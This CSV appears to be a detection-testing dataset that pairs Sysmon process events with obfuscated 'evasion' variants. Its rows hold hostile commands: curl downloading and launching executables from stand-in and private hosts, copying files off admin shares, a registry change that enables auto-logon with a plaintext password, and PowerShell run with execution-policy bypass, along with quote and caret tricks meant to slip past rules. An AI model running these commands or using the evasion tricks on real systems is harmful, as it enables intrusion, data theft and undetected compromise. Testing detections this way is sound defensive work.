Pair Index,Match File,Evasion File,Match Cmd,Evasion Cmd,Match Cmd Type,Evasion Cmd Type
663,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"{'entity_id': '{19FC45AC-9908-601C-0000-0010B85D1B00}', 'pid': 1668, 'parent': {'entity_id': '{19FC45AC-76E7-601C-0000-001081630000}', 'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'hash': {'md5': '1234a12b71dae034e45c714ae5a54412', 'sha256': '079e6bc834f38322ed5ed76295ec3961ed894084ef5cb171dffbd9b3822cc78d'}, 'executable': 'C:\\Windows\\System32\\Macromed\\Flash\\FlashPlayerUpdateService.exe', 'command_line': 'cmd.exe /c copy \\\\192.168.0.23\\c$\\Users\\ADMINI~1\\AppData\\Local\\Temp\\secret.zip D:\\', 'working_directory': 'C:\\Windows\\system32\\', 'name': 'FlashPlayerUpdateService.exe', 'args': ['C:\\Windows\\system32\\Macromed\\Flash\\FlashPlayerUpdateService.exe']}","{'command_line': 'cmd.exe /c copy \\\\192.168.0.23\\^c$\\Users\\ADMINI~1\\AppData\\Local\\Temp\\secret.zip D:\\', 'args': ['C:\\Windows\\system32\\userinit.exe'], 'hash': {'md5': '61ac3efdfacfdd3f0f11dd4fd4044223', 'sha256': '538fe1012fedc72727a8de0c2c01944b3d35c29812ecef88e95aac07235e0b0b'}, 'executable': 'C:\\Windows\\System32\\userinit.exe', 'pid': 1328, 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'pid': 384, 'executable': 'C:\\Windows\\System32\\winlogon.exe', 'command_line': 'winlogon.exe', 'name': 'winlogon.exe', 'args': ['winlogon.exe'], 'entity_id': '{19FC45AC-74C3-601C-0000-0010355C0000}'}, 'name': 'userinit.exe', 'entity_id': '{19FC45AC-74C7-601C-0000-0010DB1E0100}'}",Windows,Windows
671,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,C:\Windows\system32\Macromed\Flash\FlashPlayerUpdateService.exe,"""C:\Program Files\NetTime\NetTime.exe""",Windows,Windows
673,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"{'entity_id': '{19FC45AC-9908-601C-0000-0010B85D1B00}', 'pid': 1668, 'parent': {'entity_id': '{19FC45AC-76E7-601C-0000-001081630000}', 'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'hash': {'md5': '1234a12b71dae034e45c714ae5a54412', 'sha256': '079e6bc834f38322ed5ed76295ec3961ed894084ef5cb171dffbd9b3822cc78d'}, 'executable': 'C:\\Windows\\System32\\Macromed\\Flash\\FlashPlayerUpdateService.exe', 'command_line': 'cmd.exe /c copy \\\\192.168.0.23\\c$\\Users\\ADMINI~1\\AppData\\Local\\Temp\\secret.zip D:\\', 'working_directory': 'C:\\Windows\\system32\\', 'name': 'FlashPlayerUpdateService.exe', 'args': ['C:\\Windows\\system32\\Macromed\\Flash\\FlashPlayerUpdateService.exe']}","{'parent': {'entity_id': '{19FC45AC-7533-601C-0000-0010825E0200}', 'pid': 1516, 'executable': 'C:\\Windows\\explorer.exe', 'command_line': 'C:\\Windows\\Explorer.EXE', 'name': 'explorer.exe', 'args': ['C:\\Windows\\Explorer.EXE']}, 'args': ['C:\\Program Files\\NetTime\\NetTime.exe'], 'entity_id': '{19FC45AC-7534-601C-0000-00105F910200}', 'working_directory': 'C:\\Windows\\system32\\', 'command_line': 'C:\\Windows\\System32\\cmd.exe /c ""copy"" \\\\server123\\C$\\Users\\john\\Downloads\\Nuclear_Codes.docx C:\\', 'name': 'NetTime.exe', 'hash': {'sha256': 'd06598f2f203cec7a7a3857f727bc2ba457c1c0cef2787b90ce553407fbf8536', 'md5': '60b65f97c12ba30cd36450d376227c02'}, 'pid': 2144, 'executable': 'C:\\Program Files\\NetTime\\NetTime.exe'}",Windows,Windows
681,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,C:\Windows\system32\Macromed\Flash\FlashPlayerUpdateService.exe,"powershell ""$reg_path = 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon'; Set-ItemProperty -Path $reg_path -Name 'AutoAdminLogon' -Value '1'; Set-ItemProperty -Path $reg_path -Name 'DefaultDomainName' -Value 'BREACH'; Set-ItemProperty -Path $reg_path -Name 'DefaultPassword' -Value 'breach'; Set-ItemProperty -Path $reg_path -Name 'DefaultUserName' -Value 'client1'""",Windows,Windows
683,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"{'entity_id': '{19FC45AC-9908-601C-0000-0010B85D1B00}', 'pid': 1668, 'parent': {'entity_id': '{19FC45AC-76E7-601C-0000-001081630000}', 'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'hash': {'md5': '1234a12b71dae034e45c714ae5a54412', 'sha256': '079e6bc834f38322ed5ed76295ec3961ed894084ef5cb171dffbd9b3822cc78d'}, 'executable': 'C:\\Windows\\System32\\Macromed\\Flash\\FlashPlayerUpdateService.exe', 'command_line': 'cmd.exe /c copy \\\\192.168.0.23\\c$\\Users\\ADMINI~1\\AppData\\Local\\Temp\\secret.zip D:\\', 'working_directory': 'C:\\Windows\\system32\\', 'name': 'FlashPlayerUpdateService.exe', 'args': ['C:\\Windows\\system32\\Macromed\\Flash\\FlashPlayerUpdateService.exe']}","{'args': ['powershell', ""$reg_path = 'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'; Set-ItemProperty -Path $reg_path -Name 'AutoAdminLogon' -Value '1'; Set-ItemProperty -Path $reg_path -Name 'DefaultDomainName' -Value 'BREACH'; Set-ItemProperty -Path $reg_path -Name 'DefaultPassword' -Value 'breach'; Set-ItemProperty -Path $reg_path -Name 'DefaultUserName' -Value 'client1'""], 'hash': {'sha256': '70ba57fb0bf2f34b86426d21559f5f6d05c1268193904de8e959d7b06ce964ce', 'md5': 'eb32c070e658937aa9fa9f3ae629b2b8'}, 'entity_id': '{19FC45AC-7502-601C-0000-00105DC40200}', 'parent': {'command_line': '""C:\\Program Files\\Python35-32\\python.exe"" ""C:\\BREACH\\init_tbf_client.py"" ', 'name': 'python.exe', 'args': ['C:\\Program Files\\Python35-32\\python.exe', 'C:\\BREACH\\init_tbf_client.py'], 'entity_id': '{19FC45AC-7501-601C-0000-0010A4A70200}', 'pid': 2204, 'executable': 'C:\\Program Files\\Python35-32\\python.exe'}, 'command_line': 'cmd /c copy \\\\192.168.0.23\\admi""""$\\write.exe C:\\Users\\ADMINI~1\\AppData\\Local\\Temp', 'working_directory': 'C:\\BREACH\\', 'name': 'powershell.exe', 'pid': 2284, 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'}",Windows,Windows
692,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"{'command_line': 'curl.exe -O http://remote.server/malicious.exe & start malicious.exe', 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'entity_id': '{19FC45AC-768F-601C-0000-0010EE630000}', 'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'taskhost.exe', 'args': ['taskhost.exe', '$(Arg0)'], 'entity_id': '{19FC45AC-2624-601D-0000-0010B2D06E00}', 'executable': 'C:\\Windows\\System32\\taskhost.exe', 'pid': 1988, 'hash': {'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}}","{'working_directory': 'C:\\Windows\\system32\\', 'args': ['taskhost.exe', 'SYSTEM'], 'hash': {'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}, 'parent': {'entity_id': '{19FC45AC-7527-601C-0000-00104B610000}', 'pid': 444, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'taskhost.exe', 'entity_id': '{19FC45AC-7534-601C-0000-0010469C0200}', 'pid': 2164, 'executable': 'C:\\Windows\\System32\\taskhost.exe', 'command_line': 'cu""""rl.exe -O http://remote.server/malicious.exe & start malicious.exe'}",Windows,Windows
696,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,taskhost.exe $(Arg0),taskhost.exe SYSTEM,Windows,Windows
699,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"{'command_line': 'curl.exe -O http://remote.server/malicious.exe & start malicious.exe', 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'entity_id': '{19FC45AC-768F-601C-0000-0010EE630000}', 'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'taskhost.exe', 'args': ['taskhost.exe', '$(Arg0)'], 'entity_id': '{19FC45AC-2624-601D-0000-0010B2D06E00}', 'executable': 'C:\\Windows\\System32\\taskhost.exe', 'pid': 1988, 'hash': {'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}}","{'pid': 3124, 'executable': 'C:\\Windows\\System32\\VSSVC.exe', 'command_line': '""cu""rl.exe -O http://this.is.fine/nothing_to_see.exe & start nothing_to_see.exe', 'entity_id': '{19FC45AC-7D9A-601C-0000-001052F90E00}', 'parent': {'entity_id': '{19FC45AC-768F-601C-0000-0010EE630000}', 'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'VSSVC.exe', 'args': ['C:\\Windows\\system32\\vssvc.exe'], 'hash': {'md5': '209a3b1901b83aeb8527ed211cce9e4c', 'sha256': '1a431f6409f8e0531f600f8f988ecececb902da26bbaaf1de74a5cac29a7cb44'}, 'working_directory': 'C:\\Windows\\system32\\'}",Windows,Windows
704,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,taskhost.exe $(Arg0),C:\Windows\system32\vssvc.exe,Windows,Windows
708,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"{'command_line': 'curl.exe -O http://remote.server/malicious.exe & start malicious.exe', 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'entity_id': '{19FC45AC-768F-601C-0000-0010EE630000}', 'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'taskhost.exe', 'args': ['taskhost.exe', '$(Arg0)'], 'entity_id': '{19FC45AC-2624-601D-0000-0010B2D06E00}', 'executable': 'C:\\Windows\\System32\\taskhost.exe', 'pid': 1988, 'hash': {'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}}","{'entity_id': '{19FC45AC-89C6-601C-0000-001024DD1400}', 'command_line': 'c""ur""l -O http://192.168.191.1/shell191.exe & start shell191.exe', 'working_directory': 'C:\\BREACH\\', 'name': 'helper.exe', 'hash': {'md5': '9178bd65fc4f7ec665c799dc801d4f1e', 'sha256': '67ec19c47423b9afb9e84e56530ad59db07be36eb68c00edfaf5cb36a0f65ed8'}, 'pid': 2512, 'executable': 'C:\\Program Files\\Mozilla Firefox\\uninstall\\helper.exe', 'parent': {'args': ['C:\\Program Files\\Mozilla Firefox\\firefox.exe', '-foreground'], 'entity_id': '{19FC45AC-89C4-601C-0000-00103CC41400}', 'pid': 3456, 'executable': 'C:\\Program Files\\Mozilla Firefox\\firefox.exe', 'command_line': '""C:\\Program Files\\Mozilla Firefox\\firefox.exe"" -foreground', 'name': 'firefox.exe'}, 'args': ['C:\\Program Files\\Mozilla Firefox\\uninstall\\helper.exe', '/UpdateShortcutAppUserModelIds']}",Windows,Windows
714,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,taskhost.exe $(Arg0),"""C:\Program Files\Mozilla Firefox\uninstall\helper.exe"" /UpdateShortcutAppUserModelIds",Windows,Windows
719,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"""C:\Program Files\Mozilla Firefox\firefox.exe"" -foreground","""C:\Program Files\Mozilla Firefox\firefox.exe"" -foreground",Windows,Windows
722,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"{'entity_id': '{19FC45AC-006C-601D-0000-001047635B00}', 'command_line': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noni -ep BYPASS $encodedCommand', 'parent': {'entity_id': '{19FC45AC-76DE-601C-0000-00103F9F0100}', 'pid': 1988, 'executable': 'C:\\Program Files\\Python35-32\\python.exe', 'command_line': 'python C:\\BREACH\\userbehavior.pex --use-breach-setup', 'name': 'python.exe', 'args': ['python', 'C:\\BREACH\\userbehavior.pex', '--use-breach-setup']}, 'name': 'firefox.exe', 'args': ['C:\\Program Files\\Mozilla Firefox\\firefox.exe', '-foreground'], 'pid': 3984, 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'working_directory': 'C:\\Windows\\System32\\', 'hash': {'md5': '923fe895b22b22a9ca03c72f3d15ce20', 'sha256': '98b7f5b40c557775cd645ca69b788fe4a3deae25cdb6e5dd4fb94db1bdc10969'}}","{'entity_id': '{19FC45AC-1986-601D-0000-001057116800}', 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'command_line': '""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"" -NonInteractive -ep bypass $encodedCommand', 'working_directory': 'C:\\BREACH\\', 'args': ['C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '-NonInteractive', '-ep', 'bypass', 'cmd.exe'], 'pid': 2300, 'parent': {'entity_id': '{19FC45AC-7695-601C-0000-0010FF940100}', 'pid': 1940, 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'command_line': '""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""', 'name': 'powershell.exe', 'args': ['""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""']}, 'name': 'PowerShell.EXE', 'hash': {'sha256': '98b7f5b40c557775cd645ca69b788fe4a3deae25cdb6e5dd4fb94db1bdc10969', 'md5': '923fe895b22b22a9ca03c72f3d15ce20'}}",Windows,Windows
728,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"""C:\Program Files\Mozilla Firefox\firefox.exe"" -foreground",C:\Windows\system32\Macromed\Flash\FlashPlayerUpdateService.exe,Windows,Windows
731,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"{'entity_id': '{19FC45AC-006C-601D-0000-001047635B00}', 'command_line': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noni -ep BYPASS $encodedCommand', 'parent': {'entity_id': '{19FC45AC-76DE-601C-0000-00103F9F0100}', 'pid': 1988, 'executable': 'C:\\Program Files\\Python35-32\\python.exe', 'command_line': 'python C:\\BREACH\\userbehavior.pex --use-breach-setup', 'name': 'python.exe', 'args': ['python', 'C:\\BREACH\\userbehavior.pex', '--use-breach-setup']}, 'name': 'firefox.exe', 'args': ['C:\\Program Files\\Mozilla Firefox\\firefox.exe', '-foreground'], 'pid': 3984, 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'working_directory': 'C:\\Windows\\System32\\', 'hash': {'md5': '923fe895b22b22a9ca03c72f3d15ce20', 'sha256': '98b7f5b40c557775cd645ca69b788fe4a3deae25cdb6e5dd4fb94db1bdc10969'}}","{'pid': 4040, 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'command_line': 'taskeng.exe {2063F329-75AB-4638-869F-3E4B6EB40BE5} S-1-5-18:NT AUTHORITY\\System:Service:', 'name': 'taskeng.exe', 'args': ['taskeng.exe', '{2063F329-75AB-4638-869F-3E4B6EB40BE5}', 'S-1-5-18:NT', 'AUTHORITY\\System:Service:'], 'entity_id': '{19FC45AC-FB78-601C-0000-00107E865900}', 'pid': 3008, 'executable': 'C:\\Windows\\System32\\taskeng.exe'}, 'name': 'PowerShell.exe', 'entity_id': '{19FC45AC-FB78-601C-0000-001043885900}', 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'command_line': '""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"" -noni -ExecutionPolicy bypass $encodedCommand', 'args': ['C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '-noni', '-ExecutionPolicy', 'bypass', '$encodedCommand'], 'hash': {'md5': '1234a12b71dae034e45c714ae5a54412', 'sha256': '079e6bc834f38322ed5ed76295ec3961ed894084ef5cb171dffbd9b3822cc78d'}}",Windows,Windows
738,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"""C:\Program Files\Mozilla Firefox\firefox.exe"" -foreground",winlogon.exe,Windows,Windows
741,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"{'entity_id': '{19FC45AC-006C-601D-0000-001047635B00}', 'command_line': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noni -ep BYPASS $encodedCommand', 'parent': {'entity_id': '{19FC45AC-76DE-601C-0000-00103F9F0100}', 'pid': 1988, 'executable': 'C:\\Program Files\\Python35-32\\python.exe', 'command_line': 'python C:\\BREACH\\userbehavior.pex --use-breach-setup', 'name': 'python.exe', 'args': ['python', 'C:\\BREACH\\userbehavior.pex', '--use-breach-setup']}, 'name': 'firefox.exe', 'args': ['C:\\Program Files\\Mozilla Firefox\\firefox.exe', '-foreground'], 'pid': 3984, 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'working_directory': 'C:\\Windows\\System32\\', 'hash': {'md5': '923fe895b22b22a9ca03c72f3d15ce20', 'sha256': '98b7f5b40c557775cd645ca69b788fe4a3deae25cdb6e5dd4fb94db1bdc10969'}}","{'pid': 384, 'command_line': '""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"" -NonInteractive -ExecutionPolicy ""bypass"" $encodedCommand', 'parent': {'pid': 340, 'executable': 'C:\\Windows\\System32\\smss.exe', 'command_line': '\\SystemRoot\\System32\\smss.exe 00000001 0000003c ', 'name': 'smss.exe', 'args': ['\\SystemRoot\\System32\\smss.exe', '00000001', '0000003c'], 'entity_id': '{19FC45AC-752D-601C-0000-0010F5580000}'}, 'args': ['C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '-NonInteractive', '-ExecutionPolicy', '""bypass""', '$encodedCommand'], 'entity_id': '{19FC45AC-752D-601C-0000-0010D95C0000}', 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'working_directory': 'C:\\Windows\\system32', 'name': 'PowerShell.exe', 'hash': {'md5': '6d13e1406f50c66e2a95d97f22c47560', 'sha256': 'be40e84a824cb201f9c54db4f860f3937630fda3423940d44fcf4ac5dff44271'}}",Windows,Windows
748,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"""C:\Program Files\Mozilla Firefox\firefox.exe"" -foreground","""C:\Program Files\Windows NT\Accessories\WORDPAD.EXE"" ""C:\Program Files\Winlogbeat\winlogbeat.yml""",Windows,Windows
751,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"{'entity_id': '{19FC45AC-006C-601D-0000-001047635B00}', 'command_line': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noni -ep BYPASS $encodedCommand', 'parent': {'entity_id': '{19FC45AC-76DE-601C-0000-00103F9F0100}', 'pid': 1988, 'executable': 'C:\\Program Files\\Python35-32\\python.exe', 'command_line': 'python C:\\BREACH\\userbehavior.pex --use-breach-setup', 'name': 'python.exe', 'args': ['python', 'C:\\BREACH\\userbehavior.pex', '--use-breach-setup']}, 'name': 'firefox.exe', 'args': ['C:\\Program Files\\Mozilla Firefox\\firefox.exe', '-foreground'], 'pid': 3984, 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'working_directory': 'C:\\Windows\\System32\\', 'hash': {'md5': '923fe895b22b22a9ca03c72f3d15ce20', 'sha256': '98b7f5b40c557775cd645ca69b788fe4a3deae25cdb6e5dd4fb94db1bdc10969'}}","{'command_line': '""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"" -NonInteractive -ExecutionPolicy bypass $encodedCommand', 'entity_id': '{19FC45AC-5609-601C-0000-0010A74F0D00}', 'pid': 3688, 'parent': {'executable': 'C:\\Windows\\explorer.exe', 'command_line': 'C:\\Windows\\Explorer.EXE', 'name': 'explorer.exe', 'args': ['C:\\Windows\\Explorer.EXE'], 'entity_id': '{19FC45AC-53AF-601C-0000-0010E7660300}', 'pid': 1876}, 'name': 'PowerShell.EXE', 'args': ['""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""', '-NonInteractive', '-ExecutionPolicy', 'bypass', '$encodedCommand'], 'hash': {'md5': 'b3dd214f23037e3d3c27d6c9447b40b5', 'sha256': '86374883cd75b4c29c3fba50c8580843d06753d09f3a959f26ec8e13e69835a1'}, 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'working_directory': 'C:\\Windows\\system32\\'}",Windows,Windows
760,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"{'name': 'csrss.exe', 'args': ['%%SystemRoot%%\\system32\\csrss.exe', 'ObjectDirectory=\\Windows', 'SharedSection=1024,12288,512', 'Windows=On', 'SubSystemType=Windows', 'ServerDll=basesrv,1', 'ServerDll=winsrv:UserServerDllInitialization,3', 'ServerDll=winsrv:ConServerDllInitialization,2', 'ServerDll=sxssrv,4', 'ProfileControl=Off', 'MaxRequestThreads=16'], 'pid': 312, 'executable': 'C:\\Windows\\System32\\net.exe', 'parent': {'args': ['\\SystemRoot\\System32\\smss.exe', '00000000', '0000003c'], 'entity_id': '{19FC45AC-752D-601C-0000-0010B9510000}', 'pid': 304, 'executable': 'C:\\Windows\\System32\\smss.exe', 'command_line': '\\SystemRoot\\System32\\smss.exe 00000000 0000003c ', 'name': 'smss.exe'}, 'hash': {'md5': '342271f6142e7c70805b8a81e1ba5f5c', 'sha256': 'f9112b88fec5ef10a7aedf88dcee61956d1fcde7cb42197216e8265578713786'}, 'entity_id': '{19FC45AC-752D-601C-0000-001052530000}', 'command_line': 'net  start ""windows search""', 'working_directory': 'C:\\Windows\\system32'}","{'executable': 'C:\\Windows\\System32\\net.exe', 'parent': {'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe'], 'entity_id': '{19FC45AC-4598-601C-0000-00100D610000}', 'pid': 444, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe'}, 'args': ['C:\\Program Files\\Winlogbeat\\winlogbeat.exe', '--environment=windows_service', '-c', 'C:\\Program Files\\Winlogbeat\\winlogbeat.yml', '--path.home', 'C:\\Program Files\\Winlogbeat', '--path.data', 'C:\\ProgramData\\winlogbeat', '--path.logs', 'C:\\ProgramData\\winlogbeat\\logs', '-E', 'logging.files.redirect_stderr=true'], 'working_directory': 'C:\\Windows\\system32\\', 'name': 'winlogbeat.exe', 'hash': {'md5': '0d17999868f2768b1b050cb051884110', 'sha256': 'e72f5dba2a177397403965a3352f0cc45ec46a568a53d5ef4535fbba18e73023'}, 'entity_id': '{19FC45AC-5A5D-601C-0000-0010CB3A1000}', 'pid': 4052, 'command_line': 'net ""start"" ""windows audio""'}",Windows,Windows
